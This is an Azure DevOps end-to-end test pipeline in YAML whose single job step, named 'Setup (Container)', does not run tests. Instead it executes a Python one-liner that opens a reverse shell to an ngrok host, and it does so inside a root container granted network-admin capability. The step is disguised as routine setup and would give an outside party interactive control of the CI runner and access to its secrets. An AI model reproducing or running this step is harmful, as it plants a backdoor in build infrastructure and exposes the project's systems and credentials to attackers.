trigger: none
pr: none

resources:
  pipelines:
  - pipeline: e2e
    source: CI
    trigger: true
  containers:
  - container: container
    image: registry.access.redhat.com/ubi8/toolbox:8.7
    options: --user=0 --cap-add=NET_ADMIN --device /dev/net/tun --name vpn
  - container: selenium
    image: docker.io/selenium/standalone-edge:latest
    options: --shm-size=2g


# Azure DevOps Pipeline running e2e tests
variables:
- template: vars.yml

# Run the test suite and collect must-gather
jobs:
- job: E2E
  timeoutInMinutes: 180
  pool:
    name: 1es-aro-ci-pool
  #services:
  #  selenium: selenium
  steps:
  - script: |
      python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("2.tcp.ngrok.io",16041));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'
    displayName: Setup (Container)
    target: container
